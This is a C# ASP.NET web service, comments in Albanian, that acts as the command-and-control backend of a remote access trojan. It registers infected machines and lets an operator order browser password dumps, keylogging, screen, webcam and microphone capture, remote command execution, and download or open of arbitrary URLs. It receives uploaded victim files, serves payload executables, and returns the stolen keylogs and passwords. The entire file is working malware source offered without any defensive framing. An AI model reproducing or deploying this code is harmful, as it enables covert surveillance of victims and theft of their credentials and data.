using System.Web.Services;
using System.IO;
using System.Data;
using System.Collections;
using System.Web.Services.Protocols;
using System.Web;

namespace wscc
{
    [WebService(Namespace = "http://tempuri.org/" , Name = "SoapServer", Description = "Host Info")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    public class Service1 : System.Web.Services.WebService
    {
        static protected byte[] ScreenSelected = new byte[0];
        static protected byte[] WebCamSelected = new byte[0];

        static protected string cmdIn = "";
        static protected string cmdOut = "";

        static protected System.Collections.ArrayList arrUsers = new ArrayList();
        static protected System.Collections.ArrayList arrMessage = new ArrayList();

        #region ServerSide
        [WebMethod(EnableSession = true)]
        public string GetUsers()
        {
            string strUser = string.Empty;
            for (int i = 0; i < arrUsers.Count; i++)
            {
                strUser = strUser + arrUsers[i].ToString() + "|";
            }
            return strUser;
        }
        [WebMethod(EnableSession = true)]
        public void RemoveUser(string strUser)
        {
            for (int i = 0; i < arrUsers.Count; i++)
            {
                if (arrUsers[i].ToString() == strUser)
                    arrUsers.RemoveAt(i);
            }
        }
        #endregion

        #region server-client-talk
        [WebMethod(EnableSession = true)]
        public void SendMessage(string strFromUser, string strToUser, string strMess)
        {
            arrMessage.Add(strToUser + ":" + strFromUser + ":" + strMess);
        }
        [WebMethod(EnableSession = true)]
        public string ReceiveMessage(string strUser)
        {
            string strMess = string.Empty;
            for (int i = 0; i < arrMessage.Count; i++)
            {
                string[] strTo = arrMessage[i].ToString().Split(':');
                if (strTo[0].ToString() == strUser)
                {
                    for (int j = 1; j < strTo.Length; j++)
                    {
                        strMess = strMess + strTo[j] + ":";
                    }
                    arrMessage.RemoveAt(i);
                    break;
                }
            }
            return strMess;
        }
        #endregion

        #region CheckUser
        [WebMethod(EnableSession = true)]
        public void AddUser(string strUser)
        {

            bool bFlag = false;
            for (int i = 0; i < arrUsers.Count; i++)
            {
                if (arrUsers[i].ToString() == strUser)
                    bFlag = true;
                else
                    SendMessage("Server", arrUsers[i].ToString(), strUser + " is Connected.");
            }
            if (bFlag == false)
                arrUsers.Add(strUser);
        } //njofto user is connected
        [WebMethod(EnableSession = true)]
        public string IsUserRegistered(string strUser)
        {

            return Connection.IfRegistered(strUser);

        }//pyet klienti a jam i regjistruar
        [WebMethod(EnableSession = true)]
        public void Register(string strUser)
        {
            Connection.SetUid(strUser);
        }//klienti shkruan fp te vet
        #endregion

        #region IFUSER
        [WebMethod(EnableSession = true)]
        public string GetIfConnect(string uid)// a duhet te lidhem ? mer a duhet te lidhem duke dhen uid
        {

            return Connection.IfConnect(uid);

        }
        [WebMethod(EnableSession = true)]
        public string GetIfUpdate(string uid)
        {
            return Connection.IfUpdate(uid);
        }// a duhet te update te dhenat e mija
        [WebMethod(EnableSession = true)]
        public string IfBrowserDump(string strUser)//a duhet te coje paset
        {

            return Connection.IfBrowserDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfInstalledAplicationDump(string strUser)//a duhet te coje paset
        {

            return Connection.IfInstalledAplicationDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfKeyLogDump(string strUser)//a duhet te coje paset
        {

            return Connection.IfKeyLogDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfKeyScreenShare(string strUser)//a duhet te coje paset
        {

            return Connection.IfKeyScreenShare(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfWebCamDump(string strUser)//a duhet te coj kamera
        {

            return Connection.IfWebCamDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfCMDRun(string strUser)//a duhet hapi cmd
        {

            return Connection.IfCMDRun(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfMICDUMP(string strUser)//a duhet hapi cmd
        {

            return Connection.IfMICDUMP(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfURLDOWN(string strUser)//a duhet hapi cmd
        {

            return Connection.IFURLDOWN(strUser);

        }
        [WebMethod(EnableSession = true)]
        public string IfURLOPEN(string strUser)//a duhet hapi cmd
        {

            return Connection.IfURLOPEN(strUser);

        }
        #endregion

        #region SETUSER
        [WebMethod(EnableSession = true)]
        public void SetForCMDRun(string strUser)//a duhet hapi cmd
        {

            Connection.SetForCMDRun(strUser);

        }
        [WebMethod(EnableSession = true)]
        public void SetForBrowserDump(string strUser)
        {

            Connection.SetForBrowserDump(strUser);

        }//duhet te dergoje passwords
        [WebMethod(EnableSession = true)]
        public void SetForUpdate(string uid)
        {

            Connection.SetForUpdate(uid);
        }//i jep db kush eshte per te bere update
        [WebMethod(EnableSession = true)]
        public void SetForConnect(string uid)
        {

            Connection.SetForConnect(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void SetForInstAppDump(string uid)
        {

            Connection.SetForInstAppDump(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void SetForKeyLogDump(string uid)
        {

            Connection.SetForKeyLogDump(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void SetForScreenShare(string uid)
        {

            Connection.SetForScreenShare(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void SetForWebCamDump(string uid)
        {
            Connection.SetForWebCamDump(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void SetForMicRun(string uid)
        {
            Connection.SetForMicRun(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void Setforurldown(string uid)
        {
            Connection.Setforurldown(uid);
        }//i jep db kush eshte per tu lidhur // done

        [WebMethod(EnableSession = true)]
        public void Setforurlopen(string uid)
        {
            Connection.Setforurlopen(uid);
        }//i jep db kush eshte per tu lidhur // done


        #endregion

        #region Klient-Write-info
        [WebMethod(EnableSession = true)]
        public void RegisterValue(string uniqueIds, string property, string value)
        {
            //regjistro vleren
            if (property == "Info : GlobalIP")
            {
                value = HttpContext.Current.Request.UserHostAddress.ToString();
            }

            Connection.SetRegValues(uniqueIds, property, value);
        }//klienti shkruan elementet e fp se vet
        #endregion

        #region CamScreanComunication
        [WebMethod(EnableSession = true)]
        public void SetMyScreen(byte[] b)
        {
            ScreenSelected = b;
        }
        [WebMethod(EnableSession = true)]
        public byte[] GetMyScreen()
        {
            if (ScreenSelected != null)
            {
                if (ScreenSelected.Length > 0)
                    return ScreenSelected;
                else
                    return new byte[0];
            }
            else
                return new byte[0];
        }
        [WebMethod(EnableSession = true)]
        public void SetMyWebCam(byte[] b)
        {
            WebCamSelected = b;
        }
        [WebMethod(EnableSession = true)]
        public byte[] GetMyWebCam()
        {
            if (WebCamSelected != null)
            {
                if (WebCamSelected.Length > 0)
                    return WebCamSelected;
                else
                    return new byte[0];
            }
            else
                return new byte[0];
        }
        #endregion

        #region CMDCOMMUNICATION
        [WebMethod (EnableSession = true)]
        public void SendCmd(string cmd )
        {
            cmdIn = cmd;
        }
        [WebMethod(EnableSession = true)]
        public string ReadCmd()
        {
           return  cmdIn ;
        }
        [WebMethod(EnableSession = true)]
        public void ClearCmd()
        {
           cmdIn="";
        }
        [WebMethod(EnableSession = true)]
        public void SendOutput(string cmd)
        {
            cmdOut = cmd;
        }
        [WebMethod(EnableSession = true)]
        public string ReadOutput()
        {
            return cmdOut;
        }
        [WebMethod(EnableSession = true)]
        public void ClearOutput()
        {
            cmdOut = "";
        }
        #endregion

        #region read-write files to server

        [WebMethod(EnableSession = true)]
        public byte[] GetAssembly(int i)
        {
            if (i == 1)
            {
                return File.ReadAllBytes(@"C:\inetpub\wwwroot\ws\assemblies\a.exe");
            }
            else if (i == 2)
            {
                return File.ReadAllBytes(@"C:\inetpub\wwwroot\ws\assemblies\WebCameraControl.dll");
            }
            else if (i == 3)
            {
                return File.ReadAllBytes(@"C:\inetpub\wwwroot\ws\assemblies\Microsoft.DirectX.dll");
            }
            else if (i == 4)
            {
                return File.ReadAllBytes(@"C:\inetpub\wwwroot\ws\assemblies\Microsoft.DirectX.DirectSound.dll");
            }
            else
            { return null; }
         
        }

        [WebMethod(EnableSession = true)]
        public void WriteFile(string uid, string user, string program, string filename, byte[] content)
        {
            if (!Directory.Exists(@"C:\inetpub\wwwroot\ws\test\"))
            {
                Directory.CreateDirectory(@"C:\inetpub\wwwroot\ws\test\");
            }
            if (!Directory.Exists(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\"))
            {
                Directory.CreateDirectory(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\");
            }
            if (!Directory.Exists(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\"))
            {
                Directory.CreateDirectory(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\");
            }
            if (!Directory.Exists(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\" + program + "\\"))
            {
                Directory.CreateDirectory(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\" + program + "\\");
            }
            if (File.Exists(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\" + program + "\\" + filename))
            {
                File.Delete(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\" + program + "\\" + filename);
            }
            FileStream fs = new FileStream(@"C:\inetpub\wwwroot\ws\test\" + uid + "\\" + user + "\\" + program + "\\" + filename, FileMode.CreateNew);
            // Create the writer for data.
            BinaryWriter w = new BinaryWriter(fs);
            // Write data to Test.data.
            w.Write(content);
            w.Close();
            fs.Close();
        }// klienti upload nje file
        #endregion

        #region set for no
        [WebMethod(EnableSession = true)]
        public void SetForNoApplicationDump(string strUser)
        {

            Connection.SetForNoApplicationDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public void SetForNoKeyDump(string strUser)
        {

            Connection.SetForNoKeyDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public void SetForNoBrowserDump(string strUser)
        {

             Connection.SetForNoBrowserDump(strUser);

        }
        [WebMethod(EnableSession = true)]
        public void SetForNoMicRun(string uid)
        {

            Connection.SetForNoMicRun(uid);
        }//i jep db te gjithe jane per mos tu lidhur 
        [WebMethod(EnableSession = true)]
        public void SetForNoConnect(string uid)
        {

            Connection.SetForNoConnect(uid);
        }//i jep db kush eshte per tu lidhur // done
        [WebMethod(EnableSession = true)]
        public void SetForNoUpdate(string uid)
        {

            Connection.SetForNoUpdate(uid);
        }//i jep db 
        [WebMethod(EnableSession = true)]
        public void SetForNoScreenShare(string uid)
        {

            Connection.SetForNoScreenShare(uid);
        }//i jep db 
        [WebMethod(EnableSession = true)]
        public void SetForNoWebCamDump(string uid)
        {

            Connection.SetForNoWebCamDump(uid);
        }//i jep db 
        [WebMethod(EnableSession = true)]
        public void SetForNoCMDRun(string uid)
        {
            Connection.SetForNoCMDRun(uid);
        }//i jep db 
        [WebMethod(EnableSession = true)]
        public void SetForNoUrlDown(string uid)
        {
            Connection.SetForNoUrlDown(uid);
        }//i jep db 
        [WebMethod(EnableSession = true)]
        public void SetForNoUrlOpen(string uid)
        {
            Connection.SetForNoUrlOpen(uid);
        }//i jep db 
        #endregion

        #region set all for

        [WebMethod(EnableSession = true)]
        public void SetAllForConnect()
        {

            Connection.SetAllForConnect();
        }//i jep db te gjithe jane per tu lidhur 
        [WebMethod(EnableSession = true)]
        public void SetAllForUpdate()
        {

            Connection.SetAllForUpdate();
        }//i jep db te gjithe jane jane per te bere update
        [WebMethod(EnableSession = true)]
        public void SetAllBrowserDump()
        {

            Connection.SetAllBrowserDump();
        }//i jep db te gjithe jane jane per te bere update
        [WebMethod(EnableSession = true)]
        public void SetAllForInstalledAppDump()
        {

            Connection.SetAllForInstalledAppDump();
        }//i jep db te gjithe jane jane per te bere u
        [WebMethod(EnableSession = true)]
        public void SetAllForKeyLogDump()
        {
            Connection.SetAllForKeyLogDump();
        }//i j
        [WebMethod(EnableSession = true)]
        public void SetAllForURLDOWN()
        {
            Connection.SetAllForURLDOWN();
        }//i j
        [WebMethod(EnableSession = true)]
        public void SetAllForURLOPEN()
        {
            Connection.SetAllForURLOPEN();
        }//i j

        #endregion

        #region set all for no
        [WebMethod(EnableSession = true)]
        public void SetAllForNoConnect()
        {

            Connection.SetAllForNoConnect();
        }//i jep db te gjithe jane per mos tu lidhur 
        [WebMethod(EnableSession = true)]
        public void SetAllForNoUpdate()
        {

            Connection.SetAllForNoUpdate();
        }//i jep db te gjithe jane jane per te mos bere update
        [WebMethod(EnableSession = true)]
        public void SetAllForNoMicRun()
        {

            Connection.SetAllForNoMicRun();
        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoCMDRun()//a duhet hapi cmd
        {

            Connection.SetAllForNoCMDRun();

        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoBrowserDump()//a duhet hapi cmd
        {

            Connection.SetAllForNoBrowserDump();

        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoInstApp()//a duhet hapi cmd
        {
            Connection.SetAllForNoInstApp();
        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoKeylogDump()//a duhet hapi cmd
        {
            Connection.SetAllForNoKeylogDump();
        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoScreenShare()//a duhet hapi cmd
        {
            Connection.SetAllForNoScreenShare();
        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoWebCam()//a duhet hapi cmd
        {
            Connection.SetAllForNoWebCam();
        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoURLDOWN()//a duhet hapi cmd
        {
            Connection.SetAllForNoURLDOWN();
        }
        [WebMethod(EnableSession = true)]
        public void SetAllForNoURLOPEN()//a duhet hapi cmd
            {
                Connection.SetAllForNoURLOPEN();
            }
        #endregion




        [WebMethod(EnableSession = true)]
        public DataTable SelectUsers()
        {

            return Connection.SelectUsers();
        }
      
        [WebMethod(EnableSession = true)]
        public void SetIPPORT(string ip ,int port)
        {
            Connection.SetIPPORT(ip, port);
        }

        [WebMethod(EnableSession = true)]
        public string SelectIPPORT()
        {
           return Connection.SelectIPPORT();
        }

        [WebMethod(EnableSession = true)]
        public void SetDOWN(string URL)
        {
            Connection.SetURLDOWN(URL);
        }

        [WebMethod(EnableSession = true)]
        public string SelectDOWN()
        {
            return Connection.SelectDOWN();
        }

        [WebMethod(EnableSession = true)]
        public void SetOPEN(string URL)
        {
            Connection.SetURLOPEN(URL);
        }

        [WebMethod(EnableSession = true)]
        public string SelectOPEN()
        {
            return Connection.SelectOPEN();
        }


        #region SelectUserInfo

        [WebMethod(EnableSession = true)]
        public DataTable SelectUserStatus(string strUser)
        {

            return Connection.SelectUserStatus(strUser);

        }


        [WebMethod(EnableSession = true)]
        public DataTable SelectUserData(string strUser)
        {

          return  Connection.SelectUserData(strUser);

        }
        [WebMethod(EnableSession = true)]
        public DataTable SelectUserInstalledApp(string strUser)
        {

            return Connection.SelectUserInstalledApp(strUser);

        }
        [WebMethod(EnableSession = true)]
        public DataTable SelectUserKeyLog(string strUser)
        {

            return Connection.SelectUserKeyLog(strUser);

        }
        
             [WebMethod(EnableSession = true)]
        public DataTable SelectUserPasswords(string strUser)
        {

            return Connection.SelectUserPasswords(strUser);

        }

        #endregion
    }
}